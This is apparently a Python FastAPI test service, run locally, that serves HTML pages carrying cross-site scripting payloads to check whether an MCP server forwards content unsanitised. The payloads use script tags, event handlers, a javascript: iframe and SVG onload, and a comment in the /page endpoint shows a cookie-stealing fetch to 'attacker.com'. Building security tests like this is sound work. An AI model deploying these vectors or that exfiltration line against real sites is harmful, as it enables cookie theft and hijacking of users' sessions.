"""
XSS Attack Service - Content/HTML Server

This service serves HTML pages containing malicious JavaScript. When the MCP
server fetches and forwards this HTML without sanitization, it demonstrates
Cross-Site Scripting (XSS) vulnerability.

Port: 8003
"""

from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, Response
import uvicorn
from datetime import datetime
import json

app = FastAPI(title="Content/HTML Server", description="XSS Attack Target")

# Track all requests for logging/demonstration
request_log = []


@app.middleware("http")
async def log_requests(request: Request, call_next):
    """Log all requests for attack demonstration"""
    timestamp = datetime.now().isoformat()
    log_entry = {
        "timestamp": timestamp,
        "method": request.method,
        "path": str(request.url.path),
        "client": request.client.host if request.client else "unknown"
    }
    request_log.append(log_entry)
    print(f"[XSS Service] {timestamp} - {request.method} {request.url.path} from {log_entry['client']}")
    
    response = await call_next(request)
    return response


@app.get("/")
async def root():
    """Root endpoint - list available pages"""
    return {
        "service": "Content/HTML Server",
        "description": "This service provides HTML content and widgets",
        "pages": {
            "/page": "HTML page with inline script tags",
            "/widget": "HTML widget with event handlers",
            "/embed": "HTML with inline event handlers",
            "/marker": "HTML with obvious XSS marker for testing"
        },
        "warning": "Content should be sanitized before embedding!"
    }


@app.get("/page")
async def xss_page():
    """
    HTML page with inline script tags
    
    Contains malicious JavaScript in <script> tags that will execute
    if embedded without sanitization.
    """
    html_content = '''<!DOCTYPE html>
<html>
<head>
    <title>Legitimate Content Page</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>Welcome to Our Service</h1>
    <p>This is legitimate content that should be safe to embed.</p>
    
    <!-- MALICIOUS SCRIPT - Will execute if HTML is embedded without sanitization -->
    <script>
        alert('XSS Attack Successful! This script executed in your browser.');
        console.log('XSS_SUCCESS: Script executed from /page endpoint');
        
        // Could also: steal cookies, perform actions as user, etc.
        // document.cookie
        // fetch('http://attacker.com/steal?data=' + document.cookie)
    </script>
    
    <div>
        <p>More legitimate content here...</p>
    </div>
</body>
</html>'''
    
    return HTMLResponse(content=html_content)


@app.get("/widget")
async def xss_widget():
    """
    HTML widget with event handlers
    
    Contains malicious JavaScript in event handlers (onerror, onclick, etc.)
    that will execute if embedded without sanitization.
    """
    html_content = '''<!DOCTYPE html>
<html>
<head>
    <title>Widget Content</title>
    <meta charset="UTF-8">
</head>
<body>
    <div class="widget">
        <h2>Embedded Widget</h2>
        <p>This widget should be safe to embed in other pages.</p>
        
        <!-- MALICIOUS EVENT HANDLERS - Will execute if HTML is embedded -->
        <img src="invalid-image.jpg" 
             onerror="alert('XSS Attack via onerror handler!'); console.log('XSS_SUCCESS: onerror executed');" 
             alt="Widget image">
        
        <button onclick="alert('XSS Attack via onclick handler!'); console.log('XSS_SUCCESS: onclick executed');">
            Click me (XSS test)
        </button>
        
        <div onmouseover="alert('XSS Attack via onmouseover!');">
            Hover over me (XSS test)
        </div>
    </div>
</body>
</html>'''
    
    return HTMLResponse(content=html_content)


@app.get("/embed")
async def xss_embed():
    """
    HTML with inline event handlers
    
    Contains various inline event handlers that demonstrate different
    XSS attack vectors.
    """
    html_content = '''<!DOCTYPE html>
<html>
<head>
    <title>Embeddable Content</title>
    <meta charset="UTF-8">
</head>
<body>
    <article>
        <h1>Article Content</h1>
        <p>This article can be embedded in other pages.</p>
        
        <!-- Multiple XSS vectors -->
        <iframe src="javascript:alert('XSS via javascript: protocol')" 
                onload="console.log('XSS_SUCCESS: iframe onload executed')">
        </iframe>
        
        <svg onload="alert('XSS via SVG onload!'); console.log('XSS_SUCCESS: SVG onload executed');">
            <text>SVG Content</text>
        </svg>
        
        <body onload="console.log('XSS_SUCCESS: body onload executed')">
            <p>Content with body onload</p>
        </body>
        
        <input type="text" value="test" onfocus="alert('XSS via onfocus!');">
    </article>
</body>
</html>'''
    
    return HTMLResponse(content=html_content)


@app.get("/marker")
async def xss_marker():
    """
    HTML with obvious XSS marker
    
    Contains a very obvious XSS payload for easy testing and demonstration.
    The marker makes it clear when XSS has occurred.
    """
    html_content = '''<!DOCTYPE html>
<html>
<head>
    <title>XSS Marker Page</title>
    <meta charset="UTF-8">
    <style>
        .xss-marker {
            background: red;
            color: white;
            padding: 20px;
            font-size: 24px;
            font-weight: bold;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="xss-marker">
        ⚠️ XSS ATTACK SUCCESSFUL ⚠️
        <br>
        This content was embedded without sanitization!
    </div>
    
    <script>
        // Obvious marker script
        alert('🚨 XSS_SUCCESS: Malicious script executed! 🚨');
        console.error('XSS_ATTACK_DETECTED: Script from /marker endpoint executed');
        
        // Create visible marker on page
        document.body.insertAdjacentHTML('afterbegin', 
            '<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:10px;z-index:9999;text-align:center;font-weight:bold;">' +
            'XSS ATTACK SUCCESSFUL - This page was compromised!' +
            '</div>'
        );
    </script>
    
    <p>If you see a red banner and alert, XSS attack was successful!</p>
</body>
</html>'''
    
    return HTMLResponse(content=html_content)


@app.get("/logs")
async def get_logs():
    """Request logs endpoint"""
    return {
        "status": "success",
        "total_requests": len(request_log),
        "logs": request_log[-50:]
    }


if __name__ == "__main__":
    print("\n" + "="*70)
    print("  XSS Attack Service - Content/HTML Server")
    print("="*70)
    print("  Port: 8003")
    print("  Purpose: Serve malicious HTML for XSS attacks")
    print("  Endpoints:")
    print("    - GET /page (inline script tags)")
    print("    - GET /widget (event handlers)")
    print("    - GET /embed (inline event handlers)")
    print("    - GET /marker (obvious XSS marker)")
    print("    - GET /logs")
    print("="*70 + "\n")
    
    uvicorn.run(app, host="127.0.0.1", port=8003, log_level="info")

